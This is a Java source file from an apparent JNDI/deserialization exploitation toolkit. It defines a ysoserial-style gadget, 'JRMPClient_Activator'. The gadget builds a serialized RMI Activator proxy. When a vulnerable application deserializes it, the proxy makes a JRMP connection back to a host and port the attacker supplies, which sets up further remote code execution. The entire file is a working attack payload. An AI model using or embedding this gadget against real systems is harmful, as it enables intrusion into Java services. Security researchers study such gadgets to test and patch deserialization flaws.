package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.gadgets.annotation.Authors;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.lang.reflect.Proxy;
import java.rmi.activation.Activator;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;

@Authors({"mbechler"})
public class JRMPClient_Activator implements ObjectPayload<Activator>{
    @Override
    public Activator getObject(PayloadType type, String... param) throws Exception {
        String host;
        int    port, sep = param[0].indexOf(':');
        if (sep < 0) {
            port = (new Random()).nextInt(65535);
            host = param[0];
        } else {
            host = param[0].substring(0, sep);
            port = Integer.valueOf(param[0].substring(sep + 1)).intValue();
        }
        ObjID                         id    = new ObjID((new Random()).nextInt());
        TCPEndpoint                   te    = new TCPEndpoint(host, port);
        UnicastRef                    ref   = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj   = new RemoteObjectInvocationHandler(ref);
        Activator                     proxy = (Activator) Proxy.newProxyInstance(JRMPClient_Activator.class.getClassLoader(), new Class[]{Activator.class}, obj);
        return proxy;
    }
}
